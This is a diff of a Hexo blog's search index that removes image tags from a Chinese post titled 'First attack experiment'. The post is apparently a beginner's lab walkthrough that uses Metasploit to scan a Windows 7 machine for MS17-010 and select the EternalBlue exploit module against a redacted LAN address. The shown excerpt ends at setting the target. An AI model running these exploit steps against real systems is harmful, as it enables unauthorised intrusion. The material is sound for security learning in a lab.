@@ -36,9 +36,11 @@
     <title>第一次攻击实验</title>
     <url>/2020/04/15/ok/</url>
     <content><![CDATA[<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>初次使用 –&gt; msfdb init/reinit<br>开启数据库 –&gt; sudo service postgresql start</p>
-<h5 id="msfconsole进入hexo"><a href="#msfconsole进入hexo" class="headerlink" title="msfconsole进入hexo"></a>msfconsole进入hexo</h5><p><img src="/images/p0.png" alt=""></p>
+<h5 id="msfconsole进入hexo"><a href="#msfconsole进入hexo" class="headerlink" title="msfconsole进入hexo"></a>msfconsole进入hexo</h5>
+
 <h5 id="搜索cve17-010相关的exp"><a href="#搜索cve17-010相关的exp" class="headerlink" title="搜索cve17-010相关的exp"></a>搜索cve17-010相关的exp</h5><p>输入 –&gt; search ms17-010</p>
-<p><img src="/images/p1.png" alt=""></p>
+
+
 <h5 id="扫描漏洞"><a href="#扫描漏洞" class="headerlink" title="扫描漏洞"></a>扫描漏洞</h5><p>输入 –&gt; use auxiliary/scanner/smb/smb_ms17_010<br>使用options查看参数</p>
 <h5 id="关键来了，找了win7的IP，"><a href="#关键来了，找了win7的IP，" class="headerlink" title="关键来了，找了win7的IP，"></a>关键来了，找了win7的IP，</h5><p>输入 –&gt; set RHOSTS 192.168.XXX.XXX<br>接着 –&gt; run</p>
 <p>接着 –&gt; use exploit/windows/smb/ms17_010_eternalblue<br>使用options查看相关参数<br>然后 –&gt; set RHOSTS 192.168.XXX.XXX (靶机的IP)</p>
